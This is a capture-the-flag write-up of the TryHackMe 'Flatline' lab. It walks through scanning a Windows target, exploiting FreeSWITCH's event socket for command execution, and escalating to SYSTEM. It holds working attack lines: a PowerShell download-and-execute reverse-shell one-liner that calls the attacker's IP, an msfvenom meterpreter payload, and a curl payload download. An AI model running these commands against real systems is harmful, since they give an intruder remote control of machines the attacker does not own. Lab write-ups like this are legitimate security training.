---
title: "TryHackMe - Flatline"
author: Nasrallah
description: ""
date: 2022-12-03 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, windows, easy]
img_path: /assets/img/tryhackme/flatline
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Flatline](https://tryhackme.com/room/flatline) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 -Pn {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

- -Pn: Skip host discovery.

```terminal
Nmap scan report for 10.10.16.147 (10.10.16.147)
Host is up (0.065s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2022-10-31T07:14:54+00:00; -34m01s from scanner time.
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Not valid before: 2022-10-30T07:05:55
|_Not valid after:  2023-05-01T07:05:55
| rdp-ntlm-info: 
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2022-10-31T07:14:48+00:00
8021/tcp open  freeswitch-event   FreeSWITCH mod_event_socket
```

We found two open ports. Port 3389 is running RDP and port 8021 is running freeswitch which is a free and open-source software defined telecommunications stack for real-time communication, WebRTC, telecommunications, video, and Voice over Internet Protocol.

It also come with mod_event_socket which is a TCP based interface to control FreeSWITCH and is enabled by default.

Searching for available exlploits in this service we find the following.

```terminal
$ searchsploit freeswitch                          
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                                                                   | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                                                                      | windows/remote/47799.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There is a command execution exploit, let's copy it with `searchsploit -m windows/remote/47799.txt` and change the name to `exploit.py`.

Let's run the exploit

![](1.png)

I had to run the exploit multiple time before it gave me a result, not really sure why is that.

# **Foothold**

Let's now get a reverse shell by using this [script](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1). Download it and serve it with an http server(python3 -m http.server).

Now set up a listener and on the attacking machine with `nc -lvnp 9001`.

Now we need to execute the following command:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.0.188/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.18.0.188 -Port 9001
```

![](2.png)


# **Privilege Escalation**

For this part, I decided to get a meterpreter shell. I generated a payload using the following command.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.18.0.188 lport=7777 -f exe > meta.exe
```

Then we serve the file with python http server.

After that we upload the file the compromised machine using the following command:

```shell
curl http://10.18.0.188/meta.exe -o meta.exe
```

![](3.png)

Now we go setup a multi handler in metasploit and execute the meta.exe file with `./meta.exe` to get a meterpreter shell.

![](5.png)

We can escalate our privileges to administrator by executing `getsystem`.

![](4.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
